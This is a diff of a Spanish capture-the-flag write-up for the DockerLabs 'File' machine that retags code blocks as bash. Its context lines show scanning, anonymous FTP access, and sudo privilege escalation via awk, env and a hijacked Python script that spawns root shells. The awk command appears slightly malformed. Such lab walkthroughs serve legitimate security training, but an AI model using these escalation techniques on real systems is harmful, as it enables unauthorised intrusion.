@@ -18,17 +18,17 @@ La máquina File de DockerLabs es un reto fácil orientado a principiantes en el
 - **Dificultad**: Fácil
 
 ## DESPLIEGUE
-```python
+```bash
 bash autodeploy.sh file.tar
 ```
 ![despliegue](/assets/img/DockerLabs/MachineFile/despliegue.png)
 
 ## RECONOCIMIENTO
-```ruby
+```bash
 nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV 172.17.0.2
 ```
 
-```ruby
+```bash
 Nmap scan report for 172.17.0.2
 Host is up, received arp-response (0.000010s latency).
 Scanned at 2025-03-07 20:53:21 -05 for 9s
@@ -65,7 +65,7 @@ El puerto 80 está abierto y muestra la página por defecto del servidor Apache,
 
 En este punto, podemos pensar en enumerar la web, directorios ocultos, archivos, etc. Pero sin olvidar que podemos iniciar sesión de forma anónima por FTP, y Nmap reporta un archivo llamado `anon.txt`
 
-```ruby
+```bash
 ftp anonymous@172.17.0.2
 ```
 ![hash_ftp](/assets/img/DockerLabs/MachineFile/hash_ftp.png)
@@ -73,10 +73,10 @@ ftp anonymous@172.17.0.2
 
 Tenemos como resultado `justin`, si hacemos un intento de ataque de fuerza bruta con `hydra` por `ssh`, no tenemos éxito asi que vamos a enumerar directorios
 
-```ruby
+```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml,csv,txt,html -t 20 -b 500,502,404
 ```
-```ruby
+```bash
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -123,7 +123,7 @@ Ahora vamos al directorio `uploads`, nos ponemos en escucha por el puerto que de
 
 
 Para poder operar mejor podemos hacer un tratamiento de la TTY para obtener una bash interactiva
-```ruby
+```bash
 script /dev/null -c bash
 Ctrl + Z
 stty raw -echo; fg
@@ -160,14 +160,14 @@ Encontramos 2 credenciales de los usuarios: `mario` y `fernando`
 ![escalda_julen](/assets/img/DockerLabs/MachineFile/escalada_juel.png)
 
 como vemos podemos escalar al usuario `julen` mediante el binario `awk`, corremos a nuestra pagina de confianza [GTFOBins](https://gtfobins.github.io/)
-```ruby
+```bash
 sudo -u awk 'BEGIN {system("/bin/sh")}'
 ```
 ![julen_user](/assets/img/DockerLabs/MachineFile/julen_user.png)
 
 Ahora si hacemos un `sudo -l` con el usuario julen, podemos escalar hacia iker mediante el binario `env` 
 
-```ruby
+```bash
 sudo -u iker env /bin/sh
 ```
 ![user_iker](/assets/img/DockerLabs/MachineFile/user_iker.png)
@@ -176,7 +176,7 @@ Hacemos `sudo -l` vemos que el usuario iker puede escalar mediante un archivo en
 Pero no tenemos permisos de escritura, solo de lectura. Sin embargo, podemos eliminarlo e ingresar contenido nuevo.
 
 ![iker_escalada](/assets/img/DockerLabs/MachineFile/escalada_user.png)
-```ruby
+```bash
 echo "import os" > geo_ip.py
 echo "os.system('/bin/bash')" >> geo_ip.py
 ```
@@ -184,7 +184,7 @@ echo "os.system('/bin/bash')" >> geo_ip.py
 ![geo.py](/assets/img/DockerLabs/MachineFile/geo.py.png)
 
 
-```ruby
+```bash
 sudo /usr/bin/python3 /home/iker/geo_ip.py
 ```
 ![root](/assets/img/DockerLabs/MachineFile/root.png)
@@ -195,7 +195,7 @@ sudo /usr/bin/python3 /home/iker/geo_ip.py
 
 ## ELIMINAR LA MAQUINA
 
-```ruby
+```bash
 ctrl + c
 ```
 
